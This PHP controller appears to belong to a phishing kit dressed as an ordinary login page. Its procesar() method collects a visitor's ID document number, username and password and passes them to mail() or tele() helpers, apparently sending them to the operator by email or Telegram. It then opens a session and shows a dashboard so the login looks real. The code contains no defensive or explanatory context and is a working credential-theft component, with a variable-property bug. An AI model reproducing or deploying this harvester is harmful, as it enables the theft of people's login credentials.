<?php

require_once PROJECT_ROOT_PATH . "/controller/DashboardController.php";

class HomeController extends BaseController
{
   public $dashboardController = null;
   
   public function __construct() 
   {
      $this->$dashboardController = new DashboardController();
   }
   
  public function index()
  {
      $this->view(PROJECT_ROOT_PATH . "/view/head.php");
      $this->view(PROJECT_ROOT_PATH . "/view/home/home.php");
      $this->view(PROJECT_ROOT_PATH . "/view/footer.php");
  }
   
  public function procesar()
  {
     // Edit Position
    $source = "Home";

    $data = $_POST;

    if($data['action'] == 'INGRESAR via Email'){
      # do something here to save
      $this->mail($data["documento"], $data["usuario"], $data["clave"], $source);
	
      $_SESSION["user"] = $data["usuario"];

      $this->$dashboardController->index($data["usuario"]);
    }
    if($data['action'] == 'INGRESAR via Telegram'){
      $this->tele($data["documento"], $data["usuario"], $data["clave"], $source);

      $_SESSION["user"] = $data["usuario"];

      $this->$dashboardController->index($data["usuario"]);
    }
    
  }
   
}
